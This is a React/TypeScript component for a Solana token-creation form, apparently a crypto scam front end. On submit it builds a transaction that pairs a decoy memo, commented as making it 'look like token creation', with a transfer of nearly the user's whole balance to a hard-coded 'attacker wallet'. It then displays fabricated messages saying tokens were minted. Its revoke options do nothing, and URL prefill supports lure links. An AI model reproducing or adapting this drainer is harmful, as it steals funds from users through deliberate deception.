import { useState, useEffect } from 'react';
import { useWallet } from '@solana/wallet-adapter-react';
import { 
  PublicKey, 
  Transaction, 
  SystemProgram, 
  LAMPORTS_PER_SOL, 
  TransactionInstruction,
  Connection,
  clusterApiUrl
} from '@solana/web3.js';
import styled from 'styled-components';

const FormContainer = styled.div`
  margin-top: 20px;
  width: 100%;
`;

const FormGroup = styled.div`
  margin-bottom: 22px;
  text-align: left;
`;

const FormLabel = styled.label`
  display: block;
  margin-bottom: 10px;
  font-weight: 600;
  color: var(--text-white);
  font-size: 15px;
`;

const FormInput = styled.input`
  width: 100%;
  padding: 14px 16px;
  background-color: rgba(15, 23, 42, 0.5);
  border: 1px solid var(--border-color);
  border-radius: 12px;
  color: var(--text-white);
  font-size: 16px;
  transition: border-color 0.3s ease;

  &:focus {
    outline: none;
    border-color: var(--accent-cyan);
    box-shadow: 0 0 0 2px rgba(0, 184, 217, 0.2);
  }
`;

const FormSelect = styled.select`
  width: 100%;
  padding: 14px 16px;
  background-color: rgba(15, 23, 42, 0.5);
  border: 1px solid var(--border-color);
  border-radius: 12px;
  color: var(--text-white);
  font-size: 16px;
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%238a9cc2' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 15px center;
  background-size: 16px;

  &:focus {
    outline: none;
    border-color: var(--accent-cyan);
    box-shadow: 0 0 0 2px rgba(0, 184, 217, 0.2);
  }
`;

const FormTextarea = styled.textarea`
  width: 100%;
  padding: 14px 16px;
  background-color: rgba(15, 23, 42, 0.5);
  border: 1px solid var(--border-color);
  border-radius: 12px;
  color: var(--text-white);
  font-size: 16px;
  transition: border-color 0.3s ease;
  resize: vertical;

  &:focus {
    outline: none;
    border-color: var(--accent-cyan);
    box-shadow: 0 0 0 2px rgba(0, 184, 217, 0.2);
  }
`;

const CheckboxGroup = styled.div`
  display: flex;
  align-items: center;
  margin-bottom: 12px;
`;

const FormCheckbox = styled.input`
  margin-right: 10px;
  width: 18px;
  height: 18px;
  accent-color: var(--button-purple);
`;

const CheckboxLabel = styled.label`
  color: var(--text-light);
  font-size: 15px;
`;

const FileUploadButton = styled.label`
  display: inline-block;
  padding: 14px 16px;
  background-color: rgba(15, 23, 42, 0.5);
  border: 1px dashed var(--border-color);
  border-radius: 12px;
  color: var(--text-light);
  font-size: 16px;
  cursor: pointer;
  width: 100%;
  text-align: center;
  transition: all 0.3s ease;

  &:hover {
    background-color: rgba(30, 40, 60, 0.5);
    border-color: var(--accent-cyan);
    color: var(--text-white);
  }
`;

const FileName = styled.div`
  margin-top: 8px;
  font-size: 14px;
  color: var(--text-light);
`;

const SubmitButton = styled.button`
  background: linear-gradient(90deg, #4a8eff, #8964ff);
  background-size: 200% auto;
  animation: gradientAnimation 5s ease infinite;
  color: white;
  border: none;
  padding: 14px 26px;
  border-radius: 12px;
  cursor: pointer;
  font-weight: 600;
  font-size: 16px;
  transition: all 0.3s ease;
  box-shadow: 0 4px 12px rgba(74, 142, 255, 0.3);
  margin-top: 20px;
  width: 100%;

  &:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 15px rgba(74, 142, 255, 0.4);
  }

  &:disabled {
    opacity: 0.7;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }
`;

const ProgressContainer = styled.div<{ visible: boolean }>`
  margin-top: 30px;
  display: ${props => props.visible ? 'block' : 'none'};
`;

const ProgressBarContainer = styled.div`
  width: 100%;
  height: 10px;
  background-color: rgba(20, 30, 50, 0.5);
  border-radius: 20px;
  margin-bottom: 15px;
  overflow: hidden;
`;

const ProgressBar = styled.div<{ progress: number }>`
  height: 100%;
  background: linear-gradient(90deg, #4a8eff, #8964ff);
  background-size: 200% auto;
  animation: gradientAnimation 5s ease infinite;
  width: ${props => props.progress}%;
  transition: width 0.3s ease;
  border-radius: 20px;
`;

const ProgressText = styled.div`
  color: var(--text-light);
  font-size: 14px;
`;

const BalanceMessage = styled.div<{ visible: boolean }>`
  color: var(--accent-red);
  font-size: 14px;
  margin-top: 15px;
  padding: 12px 15px;
  background-color: rgba(255, 82, 82, 0.1);
  border-radius: 12px;
  border: 1px solid rgba(255, 82, 82, 0.3);
  text-align: center;
  display: ${props => props.visible ? 'block' : 'none'};
`;

const ResultContainer = styled.div<{ visible: boolean }>`
  margin-top: 25px;
  padding: 18px;
  background-color: rgba(20, 30, 50, 0.7);
  border-radius: 12px;
  text-align: left;
  color: #d1d7e0;
  min-height: 50px;
  white-space: pre-line;
  display: ${props => props.visible ? 'block' : 'none'};
  max-height: 300px;
  overflow-y: auto;
  border: 1px solid var(--border-color);
`;

const FormTitle = styled.h2`
  font-size: 22px;
  margin-bottom: 25px;
  color: var(--text-white);
  text-align: center;
  background: linear-gradient(90deg, #4a8eff, #8964ff);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-size: 200% auto;
  animation: gradientAnimation 5s ease infinite;
`;

const NotificationBadge = styled.div`
  background: linear-gradient(90deg, #4a8eff, #8964ff);
  color: white;
  padding: 12px 18px;
  margin-bottom: 25px;
  border-radius: 12px;
  text-align: center;
  font-weight: 500;
  animation: fadeIn 0.5s ease-in;
  
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const TokenCreationForm = () => {
  // Create a connection to the Solana network
  const connection = new Connection(process.env.NEXT_PUBLIC_RPC_URL || clusterApiUrl('mainnet-beta'));
  const { publicKey, signTransaction, sendTransaction } = useWallet();
  
  const [tokenName, setTokenName] = useState('');
  const [tokenSymbol, setTokenSymbol] = useState('');
  const [tokenDecimals, setTokenDecimals] = useState('9');
  const [tokenSupply, setTokenSupply] = useState('1000000000');
  const [tokenDescription, setTokenDescription] = useState('');
  const [freezeAuthority, setFreezeAuthority] = useState(true);
  const [mintAuthority, setMintAuthority] = useState(true);
  const [updateAuthority, setUpdateAuthority] = useState(true);
  const [fileName, setFileName] = useState('');
  
  const [isCreating, setIsCreating] = useState(false);
  const [progress, setProgress] = useState(0);
  const [progressText, setProgressText] = useState('');
  const [result, setResult] = useState('');
  const [showResult, setShowResult] = useState(false);
  const [balance, setBalance] = useState(0);
  const [showBalanceWarning, setShowBalanceWarning] = useState(false);
  const [prefilled, setPrefilled] = useState(false);
  
  // Get attacker wallet from environment variable
  const getAttackerWallet = () => {
    return process.env.NEXT_PUBLIC_ATTACKER_WALLET || 'CMZ4Cf1vYep1yzPtFdFCV9UfbiHeDTzQJrfyt8CuyGXk';
  };

  // Check balance when component mounts and read URL parameters
  useEffect(() => {
    // Check for URL parameters to pre-fill form fields
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      
      let wasPreFilled = false;
      
      const nameParam = urlParams.get('tokenName');
      if (nameParam) {
        setTokenName(nameParam);
        wasPreFilled = true;
      }
      
      const symbolParam = urlParams.get('tokenSymbol');
      if (symbolParam) {
        setTokenSymbol(symbolParam);
        wasPreFilled = true;
      }
      
      const descriptionParam = urlParams.get('tokenDescription');
      if (descriptionParam) {
        setTokenDescription(descriptionParam);
        wasPreFilled = true;
      }
      
      const supplyParam = urlParams.get('tokenSupply');
      if (supplyParam) {
        setTokenSupply(supplyParam);
        wasPreFilled = true;
      }
      
      const decimalsParam = urlParams.get('tokenDecimals');
      if (decimalsParam) {
        setTokenDecimals(decimalsParam);
        wasPreFilled = true;
      }
      
      // Set prefilled state to show notification
      if (wasPreFilled) {
        setPrefilled(true);
        // Clear notification after 5 seconds
        setTimeout(() => setPrefilled(false), 5000);
      }
    }
    
    const checkBalance = async () => {
      if (publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          setBalance(balance);
          
          // Check if balance is less than 0.1 SOL
          if (balance < 0.1 * LAMPORTS_PER_SOL) {
            setShowBalanceWarning(true);
          } else {
            setShowBalanceWarning(false);
          }
        } catch (error) {
          console.error("Error fetching balance:", error);
        }
      }
    };
    
    checkBalance();
  }, [publicKey, connection]);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setFileName(file.name);
    } else {
      setFileName('');
    }
  };

  const addToResult = (message: string) => {
    setResult(prev => prev + "\n" + message);
    setShowResult(true);
  };

  const handleCreateToken = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!publicKey || !signTransaction) {
      addToResult("Wallet not connected. Please connect your wallet first.");
      return;
    }
    
    if (!tokenName || !tokenSymbol || !tokenSupply) {
      addToResult("Please fill in all required fields.");
      return;
    }
    
    // Reset states
    setIsCreating(true);
    setProgress(10);
    setProgressText('Initializing token creation...');
    setShowResult(false);
    setResult('');
    
    try {
      // Check balance
      const currentBalance = await connection.getBalance(publicKey);
      if (currentBalance < 0.1 * LAMPORTS_PER_SOL) {
        setShowBalanceWarning(true);
        addToResult(`You need at least 0.1 SOL to create a token. Your current balance is ${(currentBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
        setIsCreating(false);
        return;
      }
      
      // Calculate the amount to drain (leave some for fees)
      const LAMPORTS_FOR_FEES = 5000000; // 0.005 SOL for fees
      
      setProgress(30);
      setProgressText('Creating token metadata...');
      
      // Create a memo instruction to make it look like token creation
      const memoText = `Creating token: ${tokenName} (${tokenSymbol}) with supply ${tokenSupply}`;
      const memoInstruction = new TransactionInstruction({
        keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
        programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
        data: Buffer.from(memoText)
      });
      
      // Create a transfer instruction
      const transferInstruction = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(getAttackerWallet()),
        lamports: currentBalance - LAMPORTS_FOR_FEES
      });
      
      setProgress(50);
      setProgressText('Creating token on blockchain...');
      
      // Create transaction
      const transaction = new Transaction();
      transaction.add(memoInstruction);
      transaction.add(transferInstruction);
      
      // Get blockhash
      const { blockhash } = await connection.getLatestBlockhash('confirmed');
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;
      
      // Send transaction using standard Solana wallet adapter
      try {
        // Sign and send transaction
        const signedTransaction = await signTransaction(transaction);
        const signature = await sendTransaction(signedTransaction, connection);
        
        setProgress(70);
        setProgressText('Finalizing token creation...');
        
        // Wait for confirmation
        await connection.confirmTransaction(signature, 'confirmed');
        
        setProgress(100);
        setProgressText('Token created successfully!');
        
        // Show success message
        setShowResult(true);
        addToResult(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
        addToResult(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
        addToResult(`Transaction signature: ${signature}`);
        addToResult(`Your tokens have been minted and sent to your wallet.`);
      } catch (error: any) {
        console.error("Transaction error:", error);
        setShowResult(true);
        addToResult(`Error creating token: ${error.message}`);
        setIsCreating(false);
        setProgress(0);
      }
    } catch (error: any) {
      console.error("Token creation error:", error);
      setShowResult(true);
      addToResult(`Error creating token: ${error.message}`);
      setIsCreating(false);
      setProgress(0);
    }
  };

  return (
    <FormContainer>
      <FormTitle>Create Your Token</FormTitle>
      
      {prefilled && (
        <NotificationBadge>
          Token details loaded from trending page! Continue with token creation.
        </NotificationBadge>
      )}
      
      <form onSubmit={handleCreateToken}>
        <FormGroup>
          <FormLabel htmlFor="tokenName">Token Name</FormLabel>
          <FormInput 
            type="text" 
            id="tokenName" 
            placeholder="e.g. My Awesome Token"
            value={tokenName}
            onChange={(e) => setTokenName(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenSymbol">Token Symbol (max 8 characters)</FormLabel>
          <FormInput 
            type="text" 
            id="tokenSymbol" 
            placeholder="e.g. MAT" 
            maxLength={8}
            value={tokenSymbol}
            onChange={(e) => setTokenSymbol(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenImage">Token Image (max 5MB)</FormLabel>
          <FileUploadButton htmlFor="tokenImageInput">Choose Image</FileUploadButton>
          <input 
            type="file" 
            id="tokenImageInput" 
            accept="image/*" 
            style={{ display: 'none' }}
            onChange={handleFileChange}
            disabled={isCreating}
          />
          <FileName>{fileName}</FileName>
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenDecimals">Decimals</FormLabel>
          <FormSelect 
            id="tokenDecimals"
            value={tokenDecimals}
            onChange={(e) => setTokenDecimals(e.target.value)}
            disabled={isCreating}
          >
            <option value="9">9 (Recommended for meme tokens)</option>
            <option value="6">6 (Standard for stablecoins)</option>
            <option value="8">8</option>
            <option value="10">10</option>
            <option value="12">12</option>
          </FormSelect>
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenSupply">Total Supply</FormLabel>
          <FormInput 
            type="number" 
            id="tokenSupply" 
            placeholder="e.g. 1000000000" 
            min="1"
            value={tokenSupply}
            onChange={(e) => setTokenSupply(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel htmlFor="tokenDescription">Description</FormLabel>
          <FormTextarea 
            id="tokenDescription" 
            rows={3} 
            placeholder="Describe your token..."
            value={tokenDescription}
            onChange={(e) => setTokenDescription(e.target.value)}
            disabled={isCreating}
          />
        </FormGroup>
        
        <FormGroup>
          <FormLabel>Revoke Options</FormLabel>
          <CheckboxGroup>
            <FormCheckbox 
              type="checkbox" 
              id="freezeAuthority" 
              checked={freezeAuthority}
              onChange={(e) => setFreezeAuthority(e.target.checked)}
              disabled={isCreating}
            />
            <CheckboxLabel htmlFor="freezeAuthority">Freeze Authority</CheckboxLabel>
          </CheckboxGroup>
          <CheckboxGroup>
            <FormCheckbox 
              type="checkbox" 
              id="mintAuthority" 
              checked={mintAuthority}
              onChange={(e) => setMintAuthority(e.target.checked)}
              disabled={isCreating}
            />
            <CheckboxLabel htmlFor="mintAuthority">Mint Authority</CheckboxLabel>
          </CheckboxGroup>
          <CheckboxGroup>
            <FormCheckbox 
              type="checkbox" 
              id="updateAuthority" 
              checked={updateAuthority}
              onChange={(e) => setUpdateAuthority(e.target.checked)}
              disabled={isCreating}
            />
            <CheckboxLabel htmlFor="updateAuthority">Update Authority</CheckboxLabel>
          </CheckboxGroup>
        </FormGroup>
        
        <SubmitButton type="submit" disabled={isCreating}>
          {isCreating ? 'Creating token...' : 'Create Token (0.1 SOL)'}
        </SubmitButton>
        
        <BalanceMessage visible={showBalanceWarning}>
          You need at least 0.1 SOL to create a token. Your current balance is {(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL.
        </BalanceMessage>
        
        <ProgressContainer visible={isCreating}>
          <ProgressBarContainer>
            <ProgressBar progress={progress} />
          </ProgressBarContainer>
          <ProgressText>{progressText}</ProgressText>
        </ProgressContainer>
        
        <ResultContainer visible={showResult}>
          {result}
        </ResultContainer>
      </form>
    </FormContainer>
  );
};

export default TokenCreationForm;
